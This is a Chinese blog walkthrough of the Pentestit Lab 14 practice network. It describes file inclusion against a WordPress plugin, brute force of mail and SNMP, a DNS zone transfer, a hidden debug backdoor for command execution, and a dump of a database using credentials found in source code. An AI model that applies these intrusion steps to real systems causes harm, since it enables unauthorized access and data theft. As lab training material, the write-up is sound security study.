<!DOCTYPE html>
<html>
  <!DOCTYPE html>
<html lang="en_US">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  
  <title>Pentestit Lab 14 Writeup/Walkthrough - x51&#39;BLOG</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
  
  <meta name="keywords" content="">
  
    <meta name="description" content="与其感叹路难行，不如马上出发。">
  
  
  

  <link rel="stylesheet" href="/css/style.css">
</head>
</html>
  <body>
    <div class="container">
      <header class="header">
  <div class="blog-title">
    <a href="/" class="logo">x51&#39;BLOG</a>
    <div class="subtitle">与其感叹路难行，不如马上出发.</div>
  </div>
  <nav class="navbar">
    <ul class="menu">
      
        <li class="menu-item">
          <a href="/" class="menu-item-link">Home</a>
        </li>
      
        <li class="menu-item">
          <a href="/about" class="menu-item-link">About</a>
        </li>
      
    </ul>
  </nav>
</header>

<article class="post">
  <div class="post-title">
    <h1 class="article-title">Pentestit Lab 14 Writeup/Walkthrough</h1>
  </div>

  <!-- 文章目录 -->
  <ol class="toc"><li class="toc-item toc-level-6"><a class="toc-link" href="#准备工作"><span class="toc-text">准备工作</span></a></li></ol><li class="toc-item toc-level-5"><a class="toc-link" href="#Site"><span class="toc-text">Site</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Mail"><span class="toc-text">Mail</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Java"><span class="toc-text">Java</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Terminal-2"><span class="toc-text">Terminal-2</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#NS"><span class="toc-text">NS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#AD"><span class="toc-text">AD</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#VPN-2"><span class="toc-text">VPN-2</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#News"><span class="toc-text">News</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#DB"><span class="toc-text">DB</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Router"><span class="toc-text">Router</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#User"><span class="toc-text">User</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Git"><span class="toc-text">Git</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Certificate"><span class="toc-text">Certificate</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Terminal-1"><span class="toc-text">Terminal-1</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#FPM"><span class="toc-text">FPM</span></a>

  <div class="post-content">
    <p>Pentestit Lab 14放出来时间快一个月了,中途断断续续做了一次,因为是第一次做这个系列靶机,很多关卡难免绕弯路,部分脑洞也是感谢热心群友提醒(比如vpn关卡),在这儿从原始笔记摘出有用的信息来把过程记录下.<br>关卡列表:<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Site</span><br><span class="line">Mail</span><br><span class="line">Vpn-1</span><br><span class="line">Ns</span><br><span class="line">Ad</span><br><span class="line">News</span><br><span class="line">Router</span><br><span class="line">Terminal-1</span><br><span class="line">Fpm</span><br><span class="line">Java</span><br><span class="line">Certificate</span><br><span class="line">Password——verfify</span><br><span class="line">Db</span><br><span class="line">User</span><br><span class="line">Dump</span><br><span class="line">Git</span><br><span class="line">Vpn-2</span><br><span class="line">Wiki</span><br><span class="line">Terminal-2</span><br><span class="line">Elasticsearch</span><br></pre></td></tr></table></figure></p>
<h6 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h6><p>实验室环境需要VPN接入,但国内访问困难,需要在配置文件中设置代理(OpenVPN Windows客户端也有设置代理选项).<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Lab's gateways:  </span><br><span class="line"><span class="number">192.168.101.14</span>  </span><br><span class="line"><span class="number">192.168.101.15</span></span><br></pre></td></tr></table></figure></p>
<p>连接成功实验室环境后,ping测网关确认网络ok:  </p>
<p><img src="/images/pasted-53.png" alt="upload successful"><br>建议操作环境:Windows物理机+Kali Linux虚拟机  </p>
<h5 id="Site"><a href="#Site" class="headerlink" title="Site"></a>Site</h5><p>先探测下端口开放情况:  </p>
<p><img src="/images/pasted-54.png" alt="upload successful"><br>访问80端口会重定向到site.test.lab,绑定host后访问  </p>
<p><img src="/images/pasted-55.png" alt="upload successful"><br>从源码可以发现站点是wordpress搭建的,探测一下插件情况:  </p>
<p><img src="/images/pasted-56.png" alt="upload successful"><br>看一下该插件历史漏洞:  </p>
<p><img src="/images/pasted-57.png" alt="upload successful"><br>尝试默认POC利用失败,会返回一个自定义的错误页面,猜测是做了防护?但深入探测发现:  </p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">包含/etc/passwd			      状态码:<span class="number">222</span>  </span><br><span class="line">包含count_of_send<span class="selector-class">.php</span>		    状态码:<span class="number">500</span>  </span><br><span class="line">包含任意不存在文件test<span class="selector-class">.aaa</span>       状态码:<span class="number">404</span></span><br></pre></td></tr></table></figure>
<p>这儿注意一下状态码,状态500应该是包含成功,222是被拦截,404是文件不存在,继续fuzz一下文件发现:  </p>
<p><img src="/images/pasted-58.png" alt="upload successful"><br>在/etc/group发现token:  </p>
<p><img src="/images/pasted-59.png" alt="upload successful">  </p>
<h5 id="Mail"><a href="#Mail" class="headerlink" title="Mail"></a>Mail</h5><p>记得上面Nmap探测结果吗?192.168.101.14还开放143端口和8080端口,143是IMAP服务,访问8080发现邮箱登录入口,猜测这儿是让登录邮箱账号.  </p>
<p><img src="/images/pasted-60.png" alt="upload successful"><br>从site收集到四个邮箱地址: (首页三个,自定义404页面一个)<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Sales Department:  sidorov@<span class="keyword">test</span>.<span class="keyword">lab</span> </span><br><span class="line"><span class="keyword">PR</span> Department： 	 ivanov@<span class="keyword">test</span>.<span class="keyword">lab</span></span><br><span class="line">IT Department：   petrov@<span class="keyword">test</span>.<span class="keyword">lab</span></span><br><span class="line">Support：		 support@<span class="keyword">test</span>.<span class="keyword">lab</span></span><br></pre></td></tr></table></figure></p>
<p>Web登录带csrf_token  </p>
<p><img src="/images/pasted-61.png" alt="upload successful"><br>处理起来比较麻烦,直接爆破imap服务:  </p>
<p><img src="/images/pasted-62.png" alt="upload successful"><br>登录邮箱,未读邮件中发现token  </p>
<p><img src="/images/pasted-63.png" alt="upload successful">  </p>
<h5 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h5><p>翻邮箱,把三个文件都下载下来看  </p>
<p><img src="/images/pasted-64.png" alt="upload successful"><br>反编译client.jar  </p>
<p><img src="/images/pasted-65.png" alt="upload successful"><br>看程序流程,一个ssh登录操作,在这之前会处理一下密码,直接运行一下拿到登录密码:  </p>
<p><img src="/images/pasted-66.png" alt="upload successful"><br>(BTW,该SSH登录密码就是JAVA的token,坑!!!)  </p>
<h5 id="Terminal-2"><a href="#Terminal-2" class="headerlink" title="Terminal-2"></a>Terminal-2</h5><p>使用拿到的ssh账号密码登录服务器,find大法发现token:  </p>
<p><img src="/images/pasted-67.png" alt="upload successful"><br>继续信息搜集,发现用户目录下有个.crt文件夹,下载回本地   </p>
<h5 id="NS"><a href="#NS" class="headerlink" title="NS"></a>NS</h5><p>其实看到这个关卡名称时就应该能猜到是nslookup,内网出现nslookup一般就在DNS区域传送上,所以直接找DNS服务器然后利用就行.  </p>
<p><img src="/images/pasted-68.png" alt="upload successful"><br>发现172.16.0.10、172.16.0.20两个DNS服务器  </p>
<p><img src="/images/pasted-69.png" alt="upload successful"><br>在172.16.0.10上利用成功,并且拿到一份内网域名列表.整理一下:  </p>
<p><img src="/images/pasted-70.png" alt="upload successful">  </p>
<h5 id="AD"><a href="#AD" class="headerlink" title="AD"></a>AD</h5><p>两个DC，目前我们在172.16.0.0/24，也就是DC2所处的网络，DC2域控服务器情况:  </p>
<p><img src="/images/pasted-71.png" alt="upload successful"><br>SMB用户枚举,发现token  </p>
<p><img src="/images/pasted-72.png" alt="upload successful">  </p>
<h5 id="VPN-2"><a href="#VPN-2" class="headerlink" title="VPN-2"></a>VPN-2</h5><p>访问vpn2.test.lab,Web根目录下存在token  </p>
<p><img src="/images/pasted-75.png" alt="upload successful">  </p>
<h5 id="News"><a href="#News" class="headerlink" title="News"></a>News</h5><p>利用前面拿到的dev.crt和dev.key,连接另一个VPN网络(修改第一个VPN配置文件中的IP地址即可,连接时加参数–key和–cert)<br>探测一下172.16.50.0/24存活  </p>
<p><img src="/images/pasted-83.png" alt="upload successful">  </p>
<p>访问news,需要登录,没有其他任何提示,目录扫描无果  </p>
<p><img src="/images/pasted-73.png" alt="upload successful">  </p>
<p>尝试通用口令    </p>
<p><img src="/images/pasted-74.png" alt="upload successful">  </p>
<p>登录dev成功  </p>
<p><img src="/images/pasted-76.png" alt="upload successful"><br>没有什么发现,尝试拿生日去爆破也没结果(后来得知需要fuzz敏感文件,任何提示都木得….)<br>这儿是个不常见的后缀<code>.save</code>比较简单的代码审计,当<code>debug</code>参数等于字符串<code>dawdawgoiagi2re0</code>,则执行参数<code>cmd</code><br><img src="/images/pasted-77.png" alt="upload successful">  </p>
<p>构造命令执行POC:  </p>
<p><img src="/images/pasted-78.png" alt="upload successful">  </p>
<p><img src="/images/pasted-79.png" alt="upload successful"><br>继续find大法!  </p>
<p><img src="/images/pasted-80.png" alt="upload successful">  </p>
<h5 id="DB"><a href="#DB" class="headerlink" title="DB"></a>DB</h5><p>发现上面源码审计时包含了一个DB.php文件,看一看  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $DB_HOST = <span class="string">'172.16.40.5'</span>;</span><br><span class="line"><span class="keyword">private</span> $DB_USER = <span class="string">'php-site'</span>;</span><br><span class="line"><span class="keyword">private</span> $DB_PASS = <span class="string">'fqafG32rGpwvbcsof'</span>;</span><br><span class="line"><span class="keyword">private</span> $DB_NAME = <span class="string">'php_site'</span>;</span><br><span class="line"><span class="keyword">private</span> $LINK;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* DB constructor.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$link = <span class="keyword">new</span> mysqli(<span class="keyword">$this</span> -&gt; DB_HOST,<span class="keyword">$this</span> -&gt; DB_USER,<span class="keyword">$this</span> -&gt; DB_PASS,<span class="keyword">$this</span> -&gt; DB_NAME);</span><br><span class="line"><span class="keyword">if</span> (!$link)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Невозможно подключиться к базе данных</span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$link -&gt;query(<span class="string">"SET NAMES 'utf8' "</span>);</span><br><span class="line"><span class="keyword">$this</span> -&gt; LINK = $link;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isLoginCorrect</span><span class="params">($login, $password)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">$login = <span class="keyword">$this</span> -&gt;LINK -&gt; real_escape_string($login);</span><br><span class="line">$query = <span class="keyword">$this</span> -&gt; LINK -&gt; prepare(<span class="string">"select password from user where login = ?"</span>);</span><br><span class="line">$query-&gt;bind_param(<span class="string">'s'</span>,$login);</span><br><span class="line">$query-&gt;execute();</span><br><span class="line">$result = $query-&gt;get_result();</span><br><span class="line">$data = $result-&gt;fetch_assoc();</span><br><span class="line">$pas = md5(md5($password));</span><br><span class="line"></span><br><span class="line"><span class="comment">// if (md5(md5($password)) === $data['password'])</span></span><br><span class="line"><span class="keyword">if</span> ($pas === $data[<span class="string">'password'</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAllPosts</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$query = <span class="keyword">$this</span>-&gt;LINK -&gt;query(<span class="string">'select id from posts order by date DESC '</span>);</span><br><span class="line">$resultQuery = $query -&gt; fetch_all();</span><br><span class="line">$result = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">foreach</span> ($resultQuery <span class="keyword">as</span> $row)</span><br><span class="line">&#123;</span><br><span class="line">array_push($result,$row[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (count($result) &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPostByID</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"Post.php"</span>;</span><br><span class="line"><span class="keyword">if</span> (!is_numeric($id)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">$query = <span class="keyword">$this</span>-&gt;LINK -&gt;prepare(<span class="string">'select team,author,text,date from posts where id = ?'</span>);</span><br><span class="line">$query-&gt;bind_param(<span class="string">'i'</span>,$id);</span><br><span class="line">$query-&gt;execute();</span><br><span class="line">$resultQuery = $query-&gt;get_result();</span><br><span class="line">$data = $resultQuery-&gt;fetch_assoc();</span><br><span class="line">$result = <span class="keyword">new</span> Post($id,$data[<span class="string">'team'</span>],$data[<span class="string">'date'</span>],$data[<span class="string">'author'</span>],$data[<span class="string">'text'</span>]);</span><br><span class="line"><span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getSearch</span> <span class="params">($text)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$text = <span class="keyword">$this</span> -&gt;LINK -&gt; real_escape_string($text);</span><br><span class="line">$query = <span class="keyword">$this</span>-&gt;LINK -&gt;prepare(<span class="string">'select id from posts where text like ?'</span>);</span><br><span class="line">$text = <span class="string">"%"</span>.$text.<span class="string">"%"</span>;</span><br><span class="line">$query-&gt;bind_param(<span class="string">'s'</span>, $text);</span><br><span class="line">$query-&gt;execute();</span><br><span class="line"></span><br><span class="line">$resultQuery = $query-&gt;get_result();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$result = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">foreach</span> ($resultQuery <span class="keyword">as</span> $row)</span><br><span class="line">&#123;</span><br><span class="line">array_push($result,$row[<span class="string">'id'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (count($result) &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>拿到了数据库服务器IP\账户\密码,想办法拖数据<br>不登陆MySQL查询:  </p>
<p><img src="/images/pasted-81.png" alt="upload successful"><br>最终获取token的完整POC:  </p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h <span class="number">172.16</span><span class="number">.40</span><span class="number">.5</span> -P3306 -u php-site -p'fqafG32rGpwvbcsof' -D php -se <span class="string">"select * from other;"</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/pasted-82.png" alt="upload successful">  </p>
<h5 id="Router"><a href="#Router" class="headerlink" title="Router"></a>Router</h5><p>观察从DNS区域传送漏洞拿到的内网域名列表和172.16.50.x这个C段的探测结果,发现172.16.50.50这个IP没有对应在内网域名上,进一步探测发现开放161端口(SNMP) ,爆破SNMP Community字符串<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">172<span class="selector-class">.16</span><span class="selector-class">.50</span><span class="selector-class">.50</span> <span class="selector-attr">[skywalker]</span> <span class="selector-tag">VyOS</span> 1<span class="selector-class">.2-rolling-201910230117</span></span><br></pre></td></tr></table></figure></p>
<p>利用snmpwalk获取详细信息<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">oot@kali:</span>~# snmpwalk -c skywalker <span class="number">172.16</span><span class="meta">.50</span><span class="meta">.50</span> -v <span class="number">1</span></span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.0</span> = STRING: <span class="string">"VyOS 1.2-rolling-201910230117"</span></span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.0</span> = OID: iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.4</span><span class="meta">.1</span><span class="meta">.44641</span></span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.3</span><span class="meta">.0</span> = Timeticks: (<span class="number">537483</span>) <span class="number">1</span>:<span class="number">29</span>:<span class="number">34.83</span></span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.4</span><span class="meta">.0</span> = STRING: <span class="string">"root"</span></span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.5</span><span class="meta">.0</span> = STRING: <span class="string">"J09tV3rN1wd"</span></span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.6</span><span class="meta">.0</span> = STRING: <span class="string">"Unknown"</span></span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.7</span><span class="meta">.0</span> = INTEGER: <span class="number">14</span></span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.8</span><span class="meta">.0</span> = Timeticks: (<span class="number">4</span>) <span class="number">0</span>:<span class="number">00</span>:<span class="number">00.04</span></span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.9</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span> = OID: iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.6</span><span class="meta">.3</span><span class="meta">.11</span><span class="meta">.3</span><span class="meta">.1</span><span class="meta">.1</span></span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.9</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.2</span> = OID: iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.6</span><span class="meta">.3</span><span class="meta">.15</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.1</span></span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.9</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.3</span> = OID: iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.6</span><span class="meta">.3</span><span class="meta">.10</span><span class="meta">.3</span><span class="meta">.1</span><span class="meta">.1</span></span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.9</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.4</span> = OID: iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.6</span><span class="meta">.3</span><span class="meta">.1</span></span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.9</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.5</span> = OID: iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.49</span></span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.9</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.6</span> = OID: iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.4</span></span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.9</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.7</span> = OID: iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.50</span></span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.9</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.8</span> = OID: iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.6</span><span class="meta">.3</span><span class="meta">.16</span><span class="meta">.2</span><span class="meta">.2</span><span class="meta">.1</span></span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.9</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.9</span> = OID: iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.6</span><span class="meta">.3</span><span class="meta">.13</span><span class="meta">.3</span><span class="meta">.1</span><span class="meta">.3</span></span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.9</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.10</span> = OID: iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.92</span></span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.9</span><span class="meta">.1</span><span class="meta">.3</span><span class="meta">.1</span> = STRING: <span class="string">"The MIB for Message Processing and Dispatching."</span></span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.9</span><span class="meta">.1</span><span class="meta">.3</span><span class="meta">.2</span> = STRING: <span class="string">"The management information definitions for the SNMP User-based Security Model."</span></span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.9</span><span class="meta">.1</span><span class="meta">.3</span><span class="meta">.3</span> = STRING: <span class="string">"The SNMP Management Architecture MIB."</span></span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.9</span><span class="meta">.1</span><span class="meta">.3</span><span class="meta">.4</span> = STRING: <span class="string">"The MIB module for SNMPv2 entities"</span></span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.9</span><span class="meta">.1</span><span class="meta">.3</span><span class="meta">.5</span> = STRING: <span class="string">"The MIB module for managing TCP implementations"</span></span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.9</span><span class="meta">.1</span><span class="meta">.3</span><span class="meta">.6</span> = STRING: <span class="string">"The MIB module for managing IP and ICMP implementations"</span></span><br><span class="line">iso<span class="meta">.3</span><span class="meta">.6</span><span class="meta">.1</span><span class="meta">.2</span><span class="meta">.1</span><span class="meta">.1</span><span class="meta">.9</span><span class="meta">.1</span><span class="meta">.3</span><span class="meta">.7</span> = STRING: <span class="string">"The MIB module for managing UDP implementations"</span></span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
